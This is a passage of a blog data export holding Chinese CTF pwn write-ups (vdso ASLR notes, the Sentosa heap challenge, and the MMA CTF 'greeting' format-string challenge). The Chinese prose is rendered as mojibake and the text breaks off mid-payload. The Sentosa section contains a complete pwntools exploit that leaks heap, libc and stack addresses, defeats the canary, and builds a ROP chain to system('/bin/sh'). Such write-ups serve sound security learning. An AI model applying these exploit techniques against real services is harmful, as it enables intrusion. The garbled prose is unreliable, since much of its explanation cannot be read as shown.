ä¸€ä¸ªropé“¾æ¥retï¼Œæ¯æ¬¡retéƒ½ä¼šæ¶ˆè€—æ‰ä¸€ä¸ªåœ°å€ï¼Œå°†rspä¸‹æ‹‰ä¸€ä¸ªå•ä½ï¼Œè¿™æ ·å°±å¯ä»¥é€æ¸å»è´´è¿‘æƒ³è¦çš„é‚£ä¸ªåœ°å€ï¼Œæœ€åæˆåŠŸretåˆ°ç›¸åº”çš„ä½ç½®ã€‚\n\nâ–²vdsoçš„ç‰¹ç‚¹ï¼š\n\n(1)vdsoçš„åœ°å€éšæœºåŒ–çš„ï¼Œä¸”å…¶ä¸­çš„æŒ‡ä»¤å¯ä»¥ä»»æ„æ‰§è¡Œï¼Œä¸éœ€è¦ä»å…¥å£å¼€å§‹ã€‚\n\n(2)ç›¸æ¯”äºæ ˆå’Œå…¶ä»–çš„ASLRï¼Œvdsoçš„éšæœºåŒ–éå¸¸çš„å¼±ï¼Œå¯¹äº32çš„ç³»ç»Ÿæ¥è¯´ï¼Œæœ‰1/256çš„æ¦‚ç‡å‘½ä¸­ã€‚\n\n(3)ä¸åŒçš„å†…æ ¸éšæœºç¨‹åº¦ä¸åŒï¼š\n\nA.è¾ƒæ—§ç‰ˆæœ¬ï¼š`0xf76d9000`-`0xf77ce000`\n\nB.è¾ƒæ–°ç‰ˆæœ¬ï¼š`0xf7ed0000`-`0xf7fd0000`\n\nC.å…¶å®ƒç‰ˆæœ¬ï¼š\n\nå¯ä»¥ç¼–è¯‘ä»¥ä¸‹æ–‡ä»¶ä¹‹åç”¨è„šæœ¬æŸ¥çœ‹ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n// compiled: gcc -g -m32 vdso_addr.c -o vdso_addr\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main()\n{\n    printf(\"vdso addr: %124$p\\n\");//è¿™é‡Œçš„åç§»ä¸åŒå†…æ ¸ä¸ä¸€æ ·ï¼Œå¯è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ã€‚\n    return 0;\n}\n```\n\næŸ¥çœ‹è„šæœ¬ï¼š\n\n\\#æ³¨é‡Šå¤´\n\n```\n#!/usr/bin/python\n# -*- coding:utf-8 -*-\n\nimport os\n\nresult = []\nfor i in range(100):\n    result += [os.popen('./vdso_addr').read()[:-1]]\n\nresult = sorted(result)\n\nfor v in result:\n    print (v)\n```\n\nâ–²vdsoçš„ç”¨æ³•ï¼šä¸vsystemç±»ä¼¼ï¼Œæ³„éœ²å‡ºåœ°å€åç›¸å½“äºæœ‰äº†syscallã€‚å¦å¤–32ä½æ¡ä»¶ä¸‹æœ‰__kernel_rt_sigreturnï¼Œå¯ä»¥æ‰“SROPã€‚\n\n \n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\nhttps://xz.aliyun.com/t/5236\n\n \n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"HCTF2018_the_end","url":"/2021/08/14/HITBCTF2017 Sentosa/","content":"\n1.å¸¸è§„checksecï¼Œä¿æŠ¤å…¨å¼€ã€‚IDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œåœ¨sub_BF0()å‡½æ•°ï¼Œå³è¯»å…¥nameçš„å‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191514947.jpeg)\n\nåˆ©ç”¨ç»“æ„ä½“é‡æ•´åŒ–\n\n```\n#æ³¨é‡Šå¤´\n\nstruct project{\nint length;\nchar name[length];\nint check;\nint price;\nint area;\nint capactity;\n}project;\n\nstruct project* projects[0x10];\n```\n\nç”±äºlengthæ˜¯ç”±ç”¨æˆ·è¾“å…¥å½±å“çš„ï¼Œé‚£ä¹ˆç»“æ„ä½“çš„å¤§å°ä¹Ÿæ˜¯ä¸å›ºå®šçš„ï¼Œæ‰€ä»¥æå‡ºæ¥å›ºå®šçš„å½¢æˆproject_behindç»“æ„ä½“æ–¹ä¾¿æŸ¥çœ‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct project_behind{\nint check;\nint price;\nint area;\nint capactity;\n}project_behind;\n```\n\nå¾—åˆ°å¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191514952.jpeg)\n\nå…¶å®é™…æ„ä¹‰å°±æ˜¯è¯»å…¥length-1ä¸ªå­—èŠ‚ï¼Œç„¶åå°†æœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º\\x00ã€‚ä½†æ˜¯è¿™é‡Œæ²¡æœ‰æ£€æŸ¥data_lengthï¼Œå³å¦‚æœä¼ å…¥çš„lengthä¸º0ï¼Œé‚£ä¹ˆdata_lengthç”±äºæ˜¯intç±»å‹ï¼Œè€Œiä¹Ÿæ˜¯intç±»å‹ï¼Œé‚£ä¹ˆiä»0å¼€å§‹åŠ éœ€è¦åŠ 0xfffff.....è¿™ä¹ˆå¤šæ‰ä¼šæŠµè¾¾-1ï¼Œç›¸å½“äºå¯ä»¥è¯»å…¥ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œé€ æˆæ ˆæº¢å‡ºã€‚\n\n2.æ ˆæº¢å‡ºï¼Œä¿æŠ¤å…¨å¼€ï¼ŒcanaryæŠŠç€æ ˆæº¢å‡ºçš„å£å­ï¼Œæ‰€ä»¥å¾—å…ˆæƒ³åŠæ³•æ³„éœ²canaryã€‚\n\n(1)é¢˜ç›®è™½ç„¶æ‰“å°äº†nameï¼Œä½†æ˜¯æ‰“å°çš„æ˜¯å †ä¸Šçš„nameï¼Œæ²¡åŠæ³•åˆ©ç”¨nameè¿ä¸Šcanaryæ¥æ³„éœ²ã€‚\n\n(2)è¶³å¤Ÿé•¿çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰è¿™ä¸ªè¿›ç¨‹æ˜¯forkåˆ›å»ºï¼Œè€Œä¸æ˜¯è¿›ç¨‹pthreadåˆ›å»ºï¼Œæ‰€ä»¥æ²¡åŠæ³•æº¢å‡ºè¶³å¤Ÿé•¿æ¥è¦†ç›–TSLä¸­çš„canaryã€‚\n\né‚£ä¹ˆæ—¢ç„¶èƒ½æ§åˆ¶æ ˆï¼Œå°±ä»æ ˆä¸Šå…¥æ‰‹ï¼Œå¯»æ‰¾addå‡½æ•°æ ˆä¸Šçš„æœ‰ç”¨æ•°æ®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchar *project; // [rsp+6Ah] [rbp-3Eh]\n-------------------------------------------------------------------\nproject = malloc(length + 21LL);\n--------------------------------------------------------------------\nprojects[idx] = project;\n```\n\nå¯ä»¥çœ‹åˆ°å¯¹IDAé‡æ•´åŒ–ä¹‹åçš„å†…å®¹ä¸­ï¼Œprojectå˜é‡ä½äºæ ˆä¸Šï¼Œé‡Œé¢ä¿å­˜ç€projectè¿™ä¸ªchunkçš„é¦–åœ°å€ï¼Œæœ€åä¼šè¢«æ”¾å…¥projectsè¿™ä¸ªæ•°ç»„ä¸­ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬ä¿®æ”¹æ‰projectå˜é‡çš„å†…å®¹ï¼Œå°†å…¶æŒ‡å‘å…¶å®ƒçš„åœ°å€ï¼Œé‚£å°±å®ç°ä»»æ„åœ°å€å¯å†™äº†ã€‚\n\n3.ä½†æ˜¯è¿™é‡Œä¿æŠ¤å…¨å¼€ï¼Œä¸€ä¸ªæœ‰ç”¨åœ°å€éƒ½æ²¡æœ‰ã€‚å¯ä»¥æ³¨æ„åˆ°projectå˜é‡æœ€åä¼šä¿å­˜ä¸€ä¸ªå †åœ°å€ï¼Œç”±äºå¤§ç«¯åºï¼Œå¦‚æœæˆ‘ä»¬å°†è¿™ä¸ªå †åœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚å˜æˆ\\x00ï¼Œé‚£ä¹ˆè¿™ä¸ªchunkå°±ä¼šæŒ‡å‘ç¬¬ä¸€ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯project[0]ï¼Œå¦‚æœç¬¬ä¸€ä¸ªchunkå¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œå°±å¯ä»¥é€šè¿‡ç¨‹åºçš„viewå‡½æ•°æ¥å°†è¿™ä¸ªchunkçš„fdæŒ‡é’ˆæ‰“å°å‡ºæ¥ã€‚\n\n4.ç”±äºä½¿ç”¨æº¢å‡ºçš„å‰ææ¡ä»¶æ˜¯lengthä¸º0ï¼Œæ‰€ä»¥malloc(21)å¯¹åº”chunkå¤§å°ä¸º0x20ï¼Œé‡Šæ”¾åä¼šè¿›å…¥fastbinsä¸­ï¼Œfastbinsä¸­chunkçš„fdä¿å­˜ä¸‹ä¸€ä¸ªchunkçš„å¤´åœ°å€ã€‚é‚£ä¹ˆå°±å¯ä»¥æ‰“å°å‡ºfdä¸Šçš„å†…å®¹ï¼Œæ³„éœ²å‡ºå †åœ°å€ã€‚\n\n5.ç°åœ¨å¯ä»¥æ§åˆ¶å †å†…å®¹äº†ï¼Œé‚£ä¹ˆé€šè¿‡æ­£å¸¸æ‰‹æ®µç”³è¯·å‡ ä¸ªchunkï¼Œåœ¨é‡Œé¢æ„é€ ä¸€ä¸ªfakechunkï¼Œä¹‹ååˆ©ç”¨æº¢å‡ºæ¼æ´æ§åˆ¶è¿™ä¸ªfakechunkï¼Œå°†å…¶é‡Šæ”¾æ‰ï¼Œä½¿å…¶è¿›å…¥unsortedbinä¸­ã€‚å†åˆ©ç”¨æº¢å‡ºæ¼æ´æ§åˆ¶è¿™ä¸ªè¢«é‡Šæ”¾çš„fakechunkï¼Œæ‰“å°å‡ºå…¶fdæŒ‡é’ˆï¼Œå°±æ˜¯main_aren+88çš„åœ°å€ï¼Œä»è€Œæ³„éœ²Libcåœ°å€ã€‚\n\n6.ç°åœ¨æœ‰äº†libcåœ°å€å’Œæ ˆæº¢å‡ºï¼Œéœ€è¦çªç ´canaryï¼Œçªç ´å£æ˜¯environè¿™ä¸ªå˜é‡ã€‚environè¿™ä¸ªå˜é‡ä»ç¨‹åºåŠ è½½æ—¶ä¿å­˜åœ¨libcæ•°æ®æ®µä¸Šï¼Œä½†æ˜¯å®ƒçš„å†…å®¹ä¿å­˜çš„æ˜¯æ ˆåœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æº¢å‡ºæ¼æ´æ‰“å°å‡ºenvironä¸­çš„æ ˆåœ°å€ã€‚å¾—åˆ°æ ˆåœ°å€ä¹‹åå°±å¯ä»¥ç”¨gdbè®¡ç®—åç§»ï¼Œé€‰å–viewå‡½æ•°æ ˆä¸Šçš„canaryï¼Œå†åˆ©ç”¨æº¢å‡ºæ¼æ´æ‰“å°å‡ºcanaryçš„å€¼ã€‚\n\n7.ä¹‹åæœ‰äº†libc,canary,æ ˆæº¢å‡º,å°±æ˜¯å¸¸è§„çš„getshelläº†ã€‚\n\n8.ç¼–å†™exp:\n\n(1)å‰ç½®å¢åˆ æ”¹æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef start_proj(length, name, price, area, capacity):\n    io.sendlineafter(\"Exit\\n\", '1')\n    io.sendlineafter(\"name: \", str(length))\n    io.sendlineafter(\"name: \", name)\n    io.sendlineafter(\"price: \", str(price))\n    io.sendlineafter(\"area: \", str(area))\n    io.sendlineafter(\"capacity: \", str(capacity))\n\ndef view_proj():\n    io.sendlineafter(\"Exit\\n\", '2')\n\ndef cancel_proj(idx):\n    io.sendlineafter(\"Exit\\n\", '4')\n    io.sendlineafter(\"number: \", str(idx))\n```\n\n(2)æ³„éœ²å †åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´ \n\ndef leak_heap():\n    global heap_base\n\n    start_proj(0, 'A', 1, 1, 1)        #chunk0\n    start_proj(0, 'A'*0x5a, 1, 1, 1)   #chunk1\n    #æº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œä¿®æ”¹æ ˆä¸Šprojectçš„æœ€åä¸€ä¸ªå­—èŠ‚ä¸º\\x00,ä½¿å…¶æŒ‡å‘chunk0\n    start_proj(0, 'A', 1, 1, 1)        #chunk2\n    cancel_proj(2)\n    cancel_proj(0)\n\n    view_proj()\n    #æ‰“å°chunk1å°±ç›¸å½“äºæ‰“å°chunk0çš„å†…å®¹ï¼Œå…¶ä¸­åŒ…å«fdæŒ‡é’ˆéƒ¨åˆ†å†…å®¹\n\n    io.recvuntil(\"Capacity: \")\n    leak = int(io.recvline()[:-1], 10) & 0xffffffff\n    heap_base = (0x55<<40) + (leak<<8) # 0x55 or 0x56\n    #ç”±äºç¨‹åºçš„å…³ç³»ï¼Œåªèƒ½æ‰“å°å‡º0x55ä¹‹åçš„å†…å®¹ï¼Œå…±4ä¸ªå­—èŠ‚ï¼Œç”±äºå †åœ°å€é«˜ä½ä¸€èˆ¬éƒ½æ˜¯0x55æˆ–0x56ï¼Œæ‰€ä»¥ç›´æ¥åŠ ä¸Šå³å¯ï¼Œæœ€åè¿˜å¾—ä¹˜ä¸Š0x100ï¼Œå› ä¸ºæ²¡æœ‰æ³„éœ²å‡ºæ¥ï¼Œéœ€è¦è°ƒè¯•çœ‹çœ‹ã€‚\n\n    log.info(\"heap base: 0x%x\" % heap_base)\n```\n\n(3)æ³„éœ²libcåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´ \n\ndef leak_libc():\n    global libc_base\n\n    start_proj(0xf, 'A', 0xd1, 0, 0x64)                       #chunk0\n    #chunk0ç”¨æ¥ä¿®æ”¹fakechunkçš„sizeä½ä¸º0xd1,å ä½0x30,ä½äºheap_base+0x60\n\n    start_proj(0x50, '\\x01', 1, 1, 1)                         #chunk2\n    #chunk2å ä½0x70ç”¨,ä½äºheap_base+0x90,'\\x01'ä¸çŸ¥é“å¹²å•¥çš„ï¼Œ'\\x00'éšä¾¿å•¥éƒ½å¯ä»¥\n\n    start_proj(0x50, 'A'*0x44+'\\x21', 1, 1, 1)                #chunk3\n    #chunk3ç”¨æ¥ä¿®æ”¹fakechunkçš„sizeä½ï¼Œå ä½0x70,ä½äºheap_base+0x100\n\n    start_proj(0, 'A'*0x5a + p64(heap_base+0x90), 1, 1, 1)    #chunk4\n    #chunk4ä¿®æ”¹chunk4æŒ‡å‘heap_base+0x90ï¼Œå ä½0x20,ä½äºheap_base\n\n    start_proj(0, 'A'*0x5a + p64(heap_base+0x8b), 1, 1, 1)    #chunk5\n    #chunk5å ä½0x20,ä¿®æ”¹chunk5æŒ‡å‘heap_base+0x8b,ä½äºheap_base+0x40\n\n    #å°†fakechunkæ”¾å…¥unsortedbinä¸­\n    cancel_proj(4)\n    \n    #è·å¾—libcåœ°å€\n    view_proj()\n\n    #ç”±äºä¸€æ¬¡åªèƒ½æ³„éœ²4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦ä¸¤éƒ¨åˆ†æ‹¼æ¥\n    for i in range(5):\n        io.recvuntil(\"Area: \")\n    leak_low = int(io.recvline()[:-1], 10) & 0xffffffff\n    io.recvuntil(\"Capacity: \")\n    leak_high = int(io.recvline()[:-1], 10) & 0xffff\n    libc_base = leak_low + (leak_high<<32) - 0x3c3b78\n\n    log.info(\"libc base: 0x%x\" % libc_base)\n```\n\nâ‘ chunk0ä¸­çš„0x64ç”¨æ¥è¿‡ç¨‹åºä¸­åˆ é™¤projectå‡½æ•°çš„æ£€æŸ¥ï¼š\n\nif ( *(project + *project + 5) != 1 )\n\nåªè¦è®¡ç®—ä¹‹åcheckä¸º1å³å¯ï¼Œå®æµ‹0x60ä¹Ÿå¯ä»¥ã€‚\n\nâ‘¡chunk3ä¸­çš„\\x21ä¸ºäº†è¿‡glibcä¸­çš„æ£€æŸ¥ã€‚\n\nâ‘¢chunk5ä¸ºäº†å¡«æ»¡ä¹‹å‰çš„ç´¢å¼•ä¸º2çš„projectï¼Œæ–¹ä¾¿ä¹‹åè¿ä½œã€‚\n\n(4)æ³„éœ²canary:\n\n```\n#æ³¨é‡Šå¤´ \n\ndef leak_stack_canary():\n    global canary\n\n    environ_addr = libc.symbols['__environ'] + libc_base\n    log.info(\"__environ address: 0x%x\" % environ_addr)\n\n    start_proj(0, 'A'*0x5a + p64(environ_addr - 9) , 1, 1, 1) # 4\n\n    view_proj()\n    for i in range(5):\n        io.recvuntil(\"Price: \")\n    leak_low = int(io.recvline()[:-1], 10) & 0xffffffff\n    io.recvuntil(\"Area: \")\n    leak_high = int(io.recvline()[:-1], 10) & 0xffff\n    stack_addr = leak_low + (leak_high<<32)\n    canary_addr = stack_addr - 0x130\n\n    log.info(\"stack address: 0x%x\" % stack_addr)\n    log.info(\"canary address: 0x%x\" % canary_addr)\n\n    start_proj(0, 'A'*0x5a + p64(canary_addr - 3), 1, 1, 1) # 6\n\n    view_proj()\n    for i in range(7):\n        io.recvuntil(\"Project: \")\n    canary = (u64(io.recvline()[:-1] + \"\\x00\"))<<8\n\n    log.info(\"canary: 0x%x\" % canary)\n```\n\n(5)æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ä¸ºsystemï¼Œpop rdiä¼ å‚getshell\n\n```\n#æ³¨é‡Šå¤´ \n\npop_rdi_ret = libc_base + 0x21102\nbin_sh = libc_base + next(libc.search('/bin/sh\\x00'))\nsystem_addr = libc_base + libc.symbols['system']\n\npayload = \"A\" * 0x68\npayload += p64(canary) # canary\npayload += \"A\" * 0x28\npayload += p64(pop_rdi_ret) # return address\npayload += p64(bin_sh)\npayload += p64(system_addr) # system(\"/bin/sh\")\n\nstart_proj(0, payload, 1, 1, 1)\n\nio.interactive()\n```\n\n \n\nâ–²è¿™é“é¢˜éœ€è¦å¾ˆå¤šè°ƒè¯•çš„åœ°æ–¹ï¼Œå®¹æ˜“å¤´å¤§å´©æºƒã€‚\n\nå‚è€ƒèµ„æ–™ï¼š\n\nctf-all-in-one\n\n \n\n \n\n \n\n \n\n \n\n \n\n \n","tags":["Heap-Skill"],"categories":["PWN","pwnå †-åˆ·é¢˜æŠ€å·§"]},{"title":"MMA CTF 2nd 2016-greeting","url":"/2021/08/14/MMA CTF 2nd 2016-greeting/","content":"\n1.å¸¸è§„checksecï¼Œå¼€äº†canaryå’ŒNXã€‚IDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œmainå‡½æ•°ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n\nchar v5; // [esp+5Ch] [ebp-44h]\nchar s; // [esp+1Ch] [ebp-84h]\n-----------------------------------------------------\nif ( !getnline(&v5, 64) )\nsprintf(&s, \"Nice to meet you, %s :)\\n\", &v5);\nreturn printf(&s);\n```\n\n2.å†æ‰¾systemï¼Œæœ‰å¯¼å…¥ï¼Œæ²¡æœ‰binshï¼Œæ²¡æœ‰Libcã€‚ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹æŸä¸ªå‡½æ•°çš„gotè¡¨æŒ‡å‘systemå‡½æ•°ï¼Œç„¶åå†æ¬¡è¿è¡Œç¨‹åºå¾—ä»¥è¾“å…¥binshä¼ ç»™è¯¥å‡½æ•°ï¼Œç›¸å½“äºè°ƒç”¨systemå‡½æ•°ï¼Œä¹‹åå°±å¯ä»¥getshellã€‚ä½†æ˜¯å‘ç°è¯¥ç¨‹åºä¸­æ²¡æœ‰å¾ªç¯ï¼Œä¿®æ”¹ä¹‹åæ²¡åŠæ³•å†æ¬¡è¾“å…¥ã€‚\n\n3.è¿™é‡Œéœ€è¦ç”¨åˆ°cè¯­è¨€çš„ç»“æ„æ‰§è¡Œï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191541317.png)\n\ncè¯­è¨€ç¼–è¯‘åï¼Œæ‰§è¡Œé¡ºåºå¦‚å›¾æ‰€ç¤ºï¼Œæ€»çš„æ¥è¯´å°±æ˜¯åœ¨mainå‡½æ•°å‰ä¼šè°ƒç”¨.initæ®µä»£ç å’Œ.init_arrayæ®µçš„å‡½æ•°æ•°ç»„ä¸­æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚åŒæ ·çš„ï¼Œmainå‡½æ•°ç»“æŸåä¹Ÿä¼šè°ƒç”¨.finiæ®µä»£ç å’Œ.fini._arraryæ®µçš„å‡½æ•°æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚\n\n4.åˆ©ç”¨Mainå‡½æ•°ç»“æŸæ—¶ä¼šè°ƒç”¨finiæ®µçš„å‡½æ•°ç»„è¿™ä¸€ä¸ªç‰¹ç‚¹ï¼Œæˆ‘ä»¬å°è¯•æ‰¾åˆ°finiå‡½æ•°ç»„çš„åœ°å€ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥ä¿®æ”¹è¯¥åœ°å€ï¼Œä¿®æ”¹.fini_arrayæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºstartï¼Œä½¿å¾—Mainå‡½æ•°é€€å‡ºæ—¶è¿è¡Œè¯¥åœ°å€å¯ä»¥é‡å¤å›åˆ°startæ¥å†æ¬¡æ‰§è¡Œä¸€æ¬¡è¾“å…¥ã€‚\n\n5.fini_arrayæ®µçš„åœ°å€ç›´æ¥ctrl+så°±å¯ä»¥æ‰¾åˆ°ï¼Œå†…å®¹æ˜¯__do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_auxï¼Œä¿å­˜çš„å†…å®¹æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè¯¥åœ°å€å¯¹åº”æ˜¯ä¸€ä¸ªä»£ç æ®µï¼Œè¯¥ä»£ç æ®µçš„å‡½æ•°åä¸º__do_global_dtors_aux proc nearã€‚å…¶å®ƒå‡½æ•°å¯¹åº”çš„got,pltå¯ä»¥é€šè¿‡elf.pot\\\\elf.pltå¯¹åº”çš„æ¥æœç´¢ã€‚\n\n6.ä½†æ˜¯è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œè¦å°†ä»€ä¹ˆåœ°å€åŠ«æŒä¸ºsystemå‡½æ•°ï¼Ÿè¿™ä¸ªåœ°å€å¿…é¡»æ˜¯åœ¨getlineæœ€åæˆ–è€…æ˜¯ä¹‹åï¼Œè€Œä¸”è¿˜éœ€è¦æœ‰å‚æ•°æ¥æ‰§è¡Œbinshã€‚ç¬¬ä¸€ä¸ªæƒ³åˆ°çš„æ˜¯sprintfï¼Œå› ä¸ºè¯¥å‡½æ•°åœ¨getlineå‡½æ•°ä¹‹åï¼Œå¹¶ä¸”ä»å³å¾€å·¦æ•°ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬ä¿å­˜çš„å†…å®¹ï¼Œä½†æ˜¯å°è¯•è¿‡åå‘ç°å´©æºƒäº†ï¼Œä¿®æ”¹æ˜¯èƒ½ä¿®æ”¹ï¼Œä½†æ˜¯ä¼ å‚çš„æ—¶å€™æœ‰ç‚¹é—®é¢˜ã€‚åé¢æŸ¥çœ‹è¯¥å‡½æ•°æ±‡ç¼–ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191541342.jpeg)\n\nå¯ä»¥çœ‹åˆ°æŸ¥çœ‹è¯¥å‡½æ•°ä»æ ˆä¸Šå–çš„ç¬¬ä¸€ä¸ªå‚æ•°åº”è¯¥æ˜¯sè¿™ä¸ªæ•°ç»„ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬ç©¿çš„v5ï¼Œè€Œå¦‚æœåŠ«æŒä¸ºsystemå‡½æ•°ï¼Œé‚£ä¹ˆå°±è¦æ±‚æ ˆä¸Šçš„espæŒ‡å‘çš„å†…å®¹çš„åœ°å€æ˜¯binshå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™é‡Œç¡®å®æŒ‡å‘sè¿™ä¸ªæ•°ç»„ä¸­çš„å†…å®¹ï¼Œä¸ºç©ºï¼Œé‚£ä¹ˆsystemå‡½æ•°å°±æ²¡åŠæ³•è°ƒç”¨æˆåŠŸäº†ã€‚åé¢åˆçœ‹printfå‡½æ•°ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œå› ä¸ºè¿™é‡Œprintfå‡½æ•°çš„å‚æ•°ä¹Ÿæ˜¯sè¿™ä¸ªæ•°ç»„ï¼Œå†…å®¹æ­¤æ—¶ä¸ºç©ºï¼Œæ— æ³•é¡ºåˆ©è°ƒç”¨ã€‚ä¹‹åå†æ‰¾ï¼Œç»è¿‡getnlineå‡½æ•°å†…éƒ¨å¯ä»¥å‘ç°æœ‰ä¸ªstrlenå‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#ä»£ç ä¸­çš„å½¢å¼ï¼š\nif ( !getnline(&v5, 64) )\n----------------------------------------------------------------\ngetnline(char *s, int n)\nreturn strlen(s);\n\n#è¯¥å‡½æ•°åŸå‹ï¼š\nunsigned int strlen(const char *str);\n-------------------------------------------------------\n#systemå‡½æ•°åŸå‹ï¼š\nint system(const char *command); \n```\n\nsystemå‡½æ•°è°ƒç”¨è§„åˆ™æ˜¯éœ€è¦ä¸€ä¸ªåœ°å€ï¼Œåœ°å€ä¸Šä¿å­˜çš„å†…å®¹æ˜¯binshå­—ç¬¦ä¸²ï¼Œæˆ–è€…ç›´æ¥\"binsh\"å­—ç¬¦ä¸²èµ‹äºˆï¼ŒCè¯­è¨€ä¸­å°±ä»£è¡¨åœ¨å…¨å±€å˜é‡ä¸­å¼€è¾Ÿä¸€å—å†…å­˜ï¼Œç„¶åè¯¥å†…å­˜ä¿å­˜çš„æ˜¯binshå­—ç¬¦ä¸²ï¼Œç„¶åå°†è¯¥å†…å­˜çš„åœ°å€èµ‹äºˆç»™systemå‡½æ•°å½“ä½œå‚æ•°è¿è¡Œã€‚æ€»ä¹‹å°±æ˜¯systemå‡½æ•°éœ€è¦çš„å‚æ•°æ˜¯ä¸€ä¸ªåœ°å€ã€‚\n\nè¿™é‡Œçš„strlenæ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œè™½ç„¶ä¸Šé¢å†™çš„åªæ˜¯sï¼Œä½†æ˜¯sä¸­ä¿å­˜çš„å†…å®¹æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè¾“å…¥AAAAï¼Œé€šè¿‡è°ƒè¯•æŸ¥çœ‹å†…å®¹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540223.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540170.jpeg)\n\nåŒæ ·çš„ï¼ŒæŸ¥çœ‹ä¸‹æ±‡ç¼–ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540150.jpeg)\n\nå¯ä»¥çœ‹åˆ°[esp+s]ç›¸å½“äºæ˜¯å–sçš„æ ˆåœ°å€èµ‹å€¼ç»™eaxï¼Œç„¶åeaxèµ‹å€¼ç»™espæ ˆé¡¶ï¼Œè¿™ä¸¤è¡Œç ´ä»£ç æœ‰ç—…ï¼Œä¸€æ¯›ä¸€æ ·ã€‚æ‰€ä»¥ç°åœ¨è·³è½¬è¿›strlenä¸­çš„è¯ï¼Œespçš„å€¼ä¹Ÿå°±æ˜¯å‚æ•°ï¼Œæ˜¯ä¸€ä¸ªæ ˆä¸Šåœ°å€ï¼Œå†…å®¹å°±æ˜¯AAAAã€‚ä¹Ÿå°±ç›¸å½“äºåœ¨strlenä¸­çš„sçš„å€¼æ˜¯ä¸€ä¸ªåœ°å€ï¼Œé‚£ä¹ˆåŠ«æŒåï¼Œå°±ç›¸å½“äºsystem(s)ï¼ŒåŒæ ·å¯ä»¥getshellã€‚\n\nâ–²åŠ«æŒä¸ºsystemå‡½æ•°ï¼Œè¦æ±‚åŸå‡½æ•°çš„å‚æ•°ä¹Ÿåº”è¯¥æ˜¯ä¸€ä¸ªåœ°å€æ‰è¡Œï¼Œä¸ç„¶æ— æ³•è·³è½¬ã€‚\n\n7.ç¡®å®šæ”»å‡»æ€è·¯åï¼Œå¼€å§‹è®¡ç®—åç§»ï¼Œå…ˆç”¨IDAç®€å•è¿œç¨‹è°ƒè¯•ï¼Œè¾“å…¥AAAAï¼Œç„¶åå°†ç¨‹åºä¸€ç›´è¿è¡Œè‡³printfå¤„ï¼Œå¯ä»¥çœ‹åˆ°æ ˆä¸­çš„åç§»ä¸º12.5å¤„ä¼šå‡ºç°Açš„asciiå€¼ï¼Œä¹Ÿå°±æ˜¯41ã€‚ç”±äºæˆ‘ä»¬éœ€è¦æ ˆä¸­å®Œæ•´çš„å¯¹åº”åœ°å€ï¼Œæ‰€ä»¥éœ€è¦è¾“å…¥aaå¡«å……ä¸¤ä¸ªå­—èŠ‚ï¼Œæ¥ä½¿å¾—åç§»é‡ä»12.5åˆ°13å¤„ï¼Œä»è€Œèƒ½å¤Ÿå®Œæ•´åœ°è¾“å…¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„åœ°å€ã€‚\n\n8.ä¹‹åç¼–å†™payloadï¼Œè¿™é‡Œä½¿ç”¨æ§åˆ¶å­—ç¬¦%hn(ä¸€æ¬¡æ”¹åŠ¨ä¸¤ä¸ªå­—èŠ‚)æ¥ä¿®æ”¹ï¼š\n\npayload = â€˜aaâ€™+p32(fini_array_addr+2) + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + str(æ ¼å¼åŒ–fini+2) + str(æ ¼å¼åŒ–fini) + str(æ 